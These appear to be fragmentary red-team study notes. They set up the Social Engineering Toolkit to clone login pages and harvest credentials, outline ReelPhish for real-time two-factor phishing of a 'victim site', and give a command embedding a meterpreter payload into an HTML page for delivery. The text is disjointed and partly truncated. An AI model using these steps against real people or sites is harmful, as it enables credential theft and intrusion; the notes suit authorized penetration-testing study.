https://0xrick.github.io/hack-the-box/safe/
https://0xrick.github.io/hack-the-box/ellingson/

cat /proc/sys/kernel/randomize_va_space
ldd /usr/bin/garbage


One of the best tools to quickly clone web application authentication pages is the Social Engineering Toolkit
(SET) by TrustedSec. This is a standard tool for any SE campaign where gaining credentials is a priority. You
can download SET at https://github.com/trustedsec/social-engineer-toolkit.

Setting Up SET
Configure SET to Use Apache (versus the default Python)
Modify the config file to the following
gedit /etc/setoolkit/set.config
APACHE_SERVER=ON
APACHE_DIRECTORY=/var/www/html
HARVESTER_LOG=/var/www/html
Start Social Engineering Toolkit (SET)
cd /opt/social-engineer-toolkit

ReelPhish https://github.com/fireeye/ReelPhish:

Clone victim site that requires 2FA authentication
On your own Attacker Box, parse the traffic required to log into the real site. In my case, I open
Burp Suite and get all the post parameters required to authenticate

https://www.fireeye.com/blog/threat-research/2018/02/reelphish-real-time-two-factor-phishing-tool.html

[https://github.com/Arno0x/EmbedInHTML]

cd /op/EmbedInHTML
python embedInHTML.py -k keypasshere -f meterpreter.xll -o index.html -w
(https://github.com/cheetz/generateJenkinsExploit), w